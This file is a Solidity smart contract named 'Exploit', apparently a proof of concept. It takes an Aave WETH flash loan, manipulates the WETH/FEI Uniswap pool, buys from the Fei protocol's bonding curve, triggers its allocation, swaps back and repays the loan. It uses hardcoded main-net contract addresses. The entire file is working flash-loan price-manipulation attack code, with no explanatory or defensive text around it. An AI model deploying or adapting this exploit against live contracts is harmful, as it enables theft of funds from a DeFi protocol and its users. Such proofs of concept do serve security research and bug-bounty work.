pragma solidity 0.6.12;

import '@nomiclabs/buidler/console.sol';
import { FlashLoanReceiverBase } from "./FlashLoanReceiverBase.sol";
import { IBondingCurve, IWETH, ILendingPool, ILendingPoolAddressesProvider, IERC20, SafeERC20} from "./Interfaces.sol";
import { SafeMath } from "./Libraries.sol";
import { IUniswapOracle, IUniswapV2Router02 } from "./IUniswap.sol";
import "./Allocator.sol";

contract Exploit is FlashLoanReceiverBase {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;

    IWETH private immutable WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapOracle private immutable UNISWAP_ORACLE = IUniswapOracle(0x087F35bd241e41Fc28E43f0E8C58d283DD55bD65);
    IUniswapV2Router02 private immutable ROUTER_02 = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IERC20 private immutable FEI = IERC20(0x956F47F50A910163D8BF957Cf5846D573E7f87CA);
    IBondingCurve private immutable ETH_BONDING_CURVE = IBondingCurve(0xe1578B4a32Eaefcd563a9E6d0dc02a4213f673B7);

    uint private _aavePremium;
    uint private _d;
    uint private _b;

    constructor(ILendingPoolAddressesProvider _addressProvider) FlashLoanReceiverBase(_addressProvider) public {}

    function start(uint d, uint b) external {
        address receiverAddress = address(this);
        _d = d;
        _b = b;

        UNISWAP_ORACLE.update();
        console.log("Updated oracle");

        // 1. Get WETH flashloan from Aave
        address[] memory assets = new address[](1);
        assets[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = d + b;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        address onBehalfOf = address(0);
        bytes memory params = "";
        uint16 referralCode = 0;
        LENDING_POOL.flashLoan(
            receiverAddress,
            assets,
            amounts,
            modes,
            onBehalfOf,
            params,
            referralCode
        );

        // END - After Aave .flashLoan returns

        console.log("");
        console.log("##################################");
        console.log("ETH balance", WETH.balanceOf(address(this)), WETH.balanceOf(address(this)) / 10**18);
    }

    function dump() internal {
        WETH.approve(address(ROUTER_02), _d);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(FEI);
        ROUTER_02.swapExactTokensForTokens(_d, 1, path, address(this), uint(-1));
        console.log("Dumped", _d / 10**18, "ETH on WETH/FEI pool");

        buyFromBondingCurve();
    }

    function buyFromBondingCurve() internal { 
        WETH.withdraw(_b);
        ETH_BONDING_CURVE.purchase{value: _b}(address(this), _b);
        console.log("Bought Fei from bonding curve for", _b / 10**18, "ETH");
        allocate();
    }

    function allocate() internal {
        new Allocator(ETH_BONDING_CURVE);
        console.log("Allocated ETH from Fei protocol");
        buyback();
    }

    function buyback() internal {
        uint remainingBalance = FEI.balanceOf(address(this));
        FEI.approve(address(ROUTER_02), remainingBalance);
        address[] memory path = new address[](2);
        path[0] = address(FEI);
        path[1] = address(WETH);
        ROUTER_02.swapExactTokensForTokens(remainingBalance, 1, path, address(this), uint(-1));
        console.log("Swapped", remainingBalance / 10**18, "Fei on WETH/FEI pool");
        console.log("Current WETH Balance : ", WETH.balanceOf(address(this)));
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    )
        external
        override
        returns (bool)
    {
        _aavePremium = premiums[0];
        console.log("Received WETH flashloan with premium", _aavePremium / 10**18);
        console.log("Current WETH Balance : ", WETH.balanceOf(address(this)));

        dump();

        IERC20(assets[0]).safeApprove(address(LENDING_POOL), _d + _b + _aavePremium);

        console.log("Repaying ETH flashloan");
        return true;
    }

    receive() external payable {}
}

